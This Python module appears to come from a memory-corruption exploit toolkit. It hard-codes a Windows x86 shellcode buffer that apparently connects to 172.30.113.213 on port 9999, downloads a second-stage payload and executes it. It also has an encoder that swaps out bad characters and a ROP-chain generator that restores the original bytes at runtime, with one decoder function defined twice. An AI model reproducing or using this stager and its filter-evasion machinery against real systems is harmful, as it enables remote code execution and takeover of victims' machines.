buf = b""
buf += b"\xfc\xe8\x90\x00\x00\x00\x60\x31\xd2\x64\x8b\x52"
buf += b"\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
buf += b"\x24\xbf\xa9\x44\xbf\x14\x8b\x72\x28\x31\xc0\xac"
buf += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
buf += b"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0"
buf += b"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"
buf += b"\x18\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3a\x49\x8b"
buf += b"\x7d\xf8\x8b\x34\x8b\x01\xd6\x31\xc0\xac\xc1\xcf"
buf += b"\x0d\x01\xc7\x38\xe0\x75\xf4\x3b\x7d\x24\x75\xe2"
buf += b"\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58"
buf += b"\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
buf += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
buf += b"\x12\xe9\x7f\xff\xff\xff\x5d\x68\x33\x32\x00\x00"
buf += b"\x68\x77\x73\x32\x5f\x54\x68\x25\x28\x8c\x2c\x89"
buf += b"\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50"
buf += b"\x68\x0f\x17\xf1\xe3\xff\xd5\x6a\x0a\x68\xac\x1e"
buf += b"\x71\xd5\x68\x02\x00\x27\x0f\x89\xe6\x50\x50\x50"
buf += b"\x50\x40\x50\x40\x50\x68\xd0\xa6\x64\xc4\xff\xd5"
buf += b"\x97\x6a\x10\x56\x57\x68\x92\x99\xfe\x9a\xff\xd5"
buf += b"\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00"
buf += b"\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x26\x56\x81"
buf += b"\x9b\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40"
buf += b"\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x31\x55\xb9"
buf += b"\x0a\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x26"
buf += b"\x56\x81\x9b\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x34\x6f\x56\x36"
buf += b"\xff\xd5\x57\x68\xed\x7a\x7f\x88\xff\xd5\x5e\x5e"
buf += b"\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff"
buf += b"\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\x19\xf6"
buf += b"\xe9\x5c\x6a\x00\x53\xff\xd5"

from struct import pack

from .util_module import log, checkBadChars, checkNullBytes
import sys


def getShellcode(encoded=False, bad_chars=None, debug=False):

    if not encoded:
        return buf

    if not bad_chars:
        log("No bad characters provided for encoding.", level="-")
        return buf, []
    elif 0x00 not in bad_chars:
        # Ensure 0x00 is the first bad character in the list
        bad_chars.insert(0, 0x00)
        log(f"Bad characters provided for encoding: {bad_chars}", level="*")


    bad_chars = set(bad_chars)
    encoded_shellcode = bytearray(buf)
    replacements = []

    try:
        for index, original in enumerate(encoded_shellcode):
            if original not in bad_chars:
                continue
            # Find a replacement byte that is not a bad character and has a safe correction value.

            for replacement in range(256):

                # Check if the replacement byte is a bad character
                if replacement in bad_chars:
                    continue

                # Calculate the correction value for the replacement byte
                correction = (original - replacement) & 0xFF

                # Check if the correction value is a bad character
                if correction in bad_chars:
                    continue

                # If we reach this point, we have found a valid replacement
                replacements.append({"index": index, "original": original, "replacement": replacement, "correction": correction})

                # Replace the original byte with the replacement byte in the encoded shellcode
                encoded_shellcode[index] = replacement

                # Log the current index
                if debug:
                    log(f"Processing byte at index {index}")

                break
            else:
                raise ValueError(f"No valid replacement found for byte 0x{original:02x} " f"at index {index}")

        if replacements:
            log(f"Replaced {len(replacements)} bad characters in shellcode.", level="*")

        if debug and replacements:
            log(f"Replacements:", level="o", indent=1)
            i = 1
            for rep in replacements:
                print(
                    f"\t\t[{i:02}] Index {rep['index']:03}: 0x{rep['original']:02x} -> 0x{rep['replacement']:02x} "
                    f"(correction: 0x{rep['correction']:02x})",
                )
                i += 1
    except ValueError as e:
        # Log the error and exit the program
        log(str(e), level="-")
        sys.exit(1)

    return bytes(encoded_shellcode), replacements


# getShellcode(encoded=True, bad_chars=list(range(0, 256)), debug=True)


def generateShellcodeDecoder(replacements, encodedShellcode, badChars, rop_pop_ecx, rop_sub_eax_ecx_pop_ebx, rop_add_ptrEAX_1_bh):

    restoreRop = b""
    for i in range(len(replacements)):
        if i == 0:
            offset = replacements[i]["index"]
        else:
            offset = replacements[i]["index"] - replacements[i - 1]["index"]
        neg_offset = (-offset) & 0xFFFFFFFF
        value = 0
        for j in range(len(badChars)):
            if encodedShellcode[replacements[i]["index"]] == badChars[j]:
                value = replacements[i]["correction"]
        value = (value << 8) | 0x11110011
        print(f"Value for replacement {i}: 0x{value:08x}")
        restoreRop += rop_pop_ecx  # pop ecx ; ret
        restoreRop += pack("<L", (neg_offset))
        restoreRop += rop_sub_eax_ecx_pop_ebx  # sub eax, ecx ;    pop ebx ; ret
        restoreRop += pack("<L", (value))  # values in BH
        restoreRop += rop_add_ptrEAX_1_bh  # add [eax+1], bh    ; ret

    return restoreRop


def generateShellcodeDecoder(replacements, rop_pop_ecx, rop_sub_eax_ecx_pop_ebx, rop_add_ptrEAX_1_bh, debug=False):
    """
    Dynamically generates the ROP decoder chain using the replacements
    dictionary generated by the getShellcode() encoder.
    """
    restoreRop = b""

    for i in range(len(replacements)):
        # Calculate relative offset from the previous replacement index
        if i == 0:
            offset = replacements[i]["index"]
        else:
            offset = replacements[i]["index"] - replacements[i - 1]["index"]

        neg_offset = (-offset) & 0xFFFFFFFF

        # Directly pull the exact correction value computed by the encoder
        correction = replacements[i]["correction"]

        # Shift into BH and apply the static XOR/OR template to avoid null bytes
        value = (correction << 8) | 0x11110011

        if debug:  # Assuming a global or passed debug flag
            print(f"[*] ROP Fix [{i:02}]: Index {replacements[i]['index']:03} | Offset: {offset} | Correction: 0x{correction:02x}")

        # Build the ROP sequence for this specific bad character
        restoreRop += rop_pop_ecx  # pop ecx ; ret
        restoreRop += pack("<L", neg_offset)
        restoreRop += rop_sub_eax_ecx_pop_ebx  # sub eax, ecx ; pop ebx ; ret
        restoreRop += pack("<L", value)  # correction value lands in BH
        restoreRop += rop_add_ptrEAX_1_bh  # add [eax+1], bh ; ret

    return restoreRop
